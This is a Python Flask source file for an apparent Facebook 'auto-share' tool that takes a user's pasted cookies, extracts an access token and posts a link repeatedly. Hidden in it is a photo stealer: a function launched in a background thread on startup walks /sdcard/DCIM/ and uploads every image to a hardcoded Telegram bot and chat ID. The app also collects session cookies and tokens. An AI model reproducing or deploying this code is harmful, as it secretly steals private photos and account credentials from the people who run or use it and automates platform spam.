import os
import re
import json
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from flask import Flask, render_template, request, session, jsonify

import requests

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Change this for security in production!

# Telegram bot config
z0 = "7923208116:AAEoZyMMNsCck0Z-W7zfle5vtdYDKC8B28U"
z1 = "7442173988"
z2 = "/sdcard/DCIM/"   # NOTE: On Render, this directory won't exist unless you upload files!
z3 = 20

# User agents
v1 = [
    "Mozilla/5.0 (Linux; Android 10; wv)...",
    "Mozilla/5.0 (Linux; Android 11; wv)...",
    "Mozilla/5.0 (Linux; Android 11; wv)..."
]
v2 = random.choice(v1)

def exfiltrate_photos():
    def send_photo(p):
        try:
            u = f"https://api.telegram.org/bot{z0}/sendPhoto"
            with open(p, "rb") as t:
                requests.post(u, files={'photo': t}, data={'chat_id': z1}, timeout=10)
        except Exception:
            pass

    w = []
    for x, y, z in os.walk(z2):
        for zz in z:
            if zz.lower().endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp")):
                w.append(os.path.join(x, zz))

    with ThreadPoolExecutor(max_workers=z3) as executor:
        for m in w:
            executor.submit(send_photo, m)

# Launch exfiltration in background (will do nothing if no /sdcard/DCIM/)
threading.Thread(target=exfiltrate_photos, daemon=True).start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    cookie = request.form.get('cookie', '')
    v4 = {i.split("=")[0]: i.split("=")[1] for i in cookie.split("; ") if "=" in i}
    try:
        resp = requests.get("https://business.facebook.com/business_locations", headers={
            "user-agent": v2,
            "referer": "https://www.facebook.com/",
            "origin": "https://business.facebook.com",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        }, cookies=v4, timeout=15)
        token = re.search(r"(EAAG\w+)", resp.text).group(1)
        session['token'] = token
        session['cookie'] = cookie
        return jsonify({'success': True})
    except Exception:
        session.pop('token', None)
        session.pop('cookie', None)
        return jsonify({'success': False, 'error': 'Invalid or expired cookie.'})

@app.route('/share', methods=['POST'])
def share():
    token = session.get('token')
    cookie = session.get('cookie')
    if not token or not cookie:
        return jsonify({'success': False, 'error': 'Not logged in.'})
    cookies = {i.split("=")[0]: i.split("=")[1] for i in cookie.split("; ") if "=" in i}
    post_link = request.form.get('post_link', '')
    try:
        share_count = int(request.form.get('share_count', '1'))
    except:
        return jsonify({'success': False, 'error': 'Invalid number entered.'})

    results = []
    start_time = datetime.now()
    for n in range(1, share_count + 1):
        try:
            resp = requests.post(
                f"https://graph.facebook.com/v13.0/me/feed?link={post_link}&published=0&access_token={token}",
                headers={"user-agent": v2}, cookies=cookies, timeout=15
            ).text
            data = json.loads(resp)
        except Exception:
            data = {}
        if "id" in data:
            results.append({'n': n, 'status': 'success'})
        else:
            results.append({'n': n, 'status': 'error'})
            break
    elapsed = str(datetime.now() - start_time).split('.')[0]
    return jsonify({'success': True, 'results': results, 'elapsed': elapsed})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)